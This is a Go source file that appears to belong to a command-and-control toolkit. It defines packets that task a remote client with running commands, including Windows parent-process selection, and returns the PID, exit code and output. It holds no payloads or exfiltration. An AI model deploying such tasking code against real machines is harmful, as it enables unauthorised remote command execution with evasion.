package task

import (
	"bytes"
	"context"
	"io"
	"io/ioutil"
	"time"
	"unsafe"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
)

// Process is a struct that is similar to the 'cmd.Process' struct. This is used to Task a Client with running
// a specified command.
type Process struct {
	Dir string

	Env, Args []string
	Stdin     []byte

	Timeout time.Duration
	Flags   uint32
	Filter  *cmd.Filter

	Wait bool
}

// Run returns a Packet with the 'TvExecute' ID value and a Process struct in the payload that is based on the
// provided string vardict. By default, this will wait for the Process to complete before the client returns the
// output.
func Run(s ...string) *com.Packet {
	return Execute(&Process{Args: s, Wait: true})
}

// Command returns a Packet with the 'TvExecute' ID value and a Process struct in the payload that is based on the
// supplied command, which is parsed using 'cmd.Split'. By default, this will wait for the Process to complete before
// the client returns the output.
func Command(s string) *com.Packet {
	return Execute(&Process{Args: cmd.Split(s), Wait: true})
}

// Execute returns a Packet with the 'TvExecute' ID value and the provided Process struct as the Payload.
func Execute(e *Process) *com.Packet {
	p := &com.Packet{ID: TvExecute}
	e.MarshalStream(p)
	return p
}

// SetFlags will set the startup Flag values used for Windows programs. This function overrites many
// of the 'Set*' functions. Has no effect if the device is not running Windows.
func (p *Process) SetFlags(f uint32) {
	p.Flags = f
}

// SetParent will instruct the Process to choose a parent with the supplied process Filter. If the Filter is nil
// this will use the current process (default). This function has no effect if the device is not running Windows.
// Setting the Parent process will automatically set 'SetNewConsole' to true.
func (p *Process) SetParent(f *cmd.Filter) {
	p.Filter = f
}

// SetStdin wil attempt to read all the data from the supplied reader to fill the Stdin byte array for this Process
// struct. This function will return an error if any occurs during reading.
func (p *Process) SetStdin(r io.Reader) error {
	var err error
	p.Stdin, err = ioutil.ReadAll(r)
	return err
}

// MarshalStream writes the data for this Process to the supplied Writer.
func (p Process) MarshalStream(w data.Writer) error {
	if err := data.WriteStringList(w, p.Args); err != nil {
		return err
	}
	if err := w.WriteString(p.Dir); err != nil {
		return err
	}
	if err := data.WriteStringList(w, p.Env); err != nil {
		return err
	}
	if err := w.WriteBool(p.Wait); err != nil {
		return err
	}
	if err := w.WriteUint32(p.Flags); err != nil {
		return err
	}
	if err := w.WriteUint64(uint64(p.Timeout)); err != nil {
		return err
	}
	if err := w.WriteBool(p.Filter != nil); err != nil {
		return err
	}
	if p.Filter != nil {
		if err := p.Filter.MarshalStream(w); err != nil {
			return err
		}
	}
	if err := w.WriteBytes(p.Stdin); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream reads the data for this Process from the supplied Reader.
func (p *Process) UnmarshalStream(r data.Reader) error {
	if err := data.ReadStringList(r, &p.Args); err != nil {
		return err
	}
	if err := r.ReadString(&p.Dir); err != nil {
		return err
	}
	if err := data.ReadStringList(r, &p.Env); err != nil {
		return err
	}
	if err := r.ReadBool(&p.Wait); err != nil {
		return err
	}
	if err := r.ReadUint32(&p.Flags); err != nil {
		return err
	}
	if err := r.ReadUint64((*uint64)(unsafe.Pointer(&p.Timeout))); err != nil {
		return err
	}
	f, err := r.Bool()
	if err != nil {
		return err
	}
	if f {
		p.Filter = new(cmd.Filter)
		if err := p.Filter.UnmarshalStream(r); err != nil {
			return err
		}
	}
	if p.Stdin, err = r.Bytes(); err != nil {
		return err
	}
	return nil
}
func process(x context.Context, p *com.Packet) (*com.Packet, error) {
	var e Process
	if err := e.UnmarshalStream(p); err != nil {
		return nil, err
	}
	var (
		z = cmd.NewProcessContext(x, e.Args...)
		o bytes.Buffer
	)
	z.SetFlags(e.Flags)
	if z.SetParent(e.Filter); len(e.Stdin) > 0 {
		z.Stdin = bytes.NewReader(e.Stdin)
	}
	z.Timeout, z.Dir, z.Env = e.Timeout, e.Dir, e.Env
	if e.Wait {
		z.Stdout = &o
		z.Stderr = &o
	}
	if err := z.Start(); err != nil {
		return nil, err
	}
	w := new(com.Packet)
	if w.WriteUint64(z.Pid()); !e.Wait {
		w.WriteInt32(0)
		return w, nil
	}
	err := z.Wait()
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		w.Clear()
		return nil, err
	}
	c, _ := z.ExitCode()
	w.WriteInt32(c)
	io.Copy(w, &o)
	return w, nil
}
